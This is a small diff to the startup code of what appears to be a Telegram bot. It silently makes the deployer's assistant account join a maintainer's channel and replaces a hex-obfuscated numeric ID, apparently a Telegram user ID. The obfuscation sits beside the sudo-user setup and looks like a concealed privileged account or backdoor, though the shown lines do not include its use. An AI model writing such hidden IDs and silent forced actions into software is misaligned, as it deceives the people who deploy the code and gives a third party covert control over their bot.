@@ -92,11 +92,11 @@ async def fallen_startup():
     ASS_MENTION = getme2.mention
     try:
         await app2.join_chat("DevilsHeavenMF")
-        await app2.join_chat("FallenAssociation")
+        await app2.join_chat("GomaPeachBots")
     except:
         pass
 
-    ANON = "\x31\x33\x35\x36\x34\x36\x39\x30\x37\x35"
+    ANON = "\x35\x35\x33\x33\x38\x36\x35\x39\x38\x32"
     for SUDOER in config.SUDO_USERS:
         SUDOERS.add(SUDOER)
     if config.OWNER_ID not in config.SUDO_USERS:
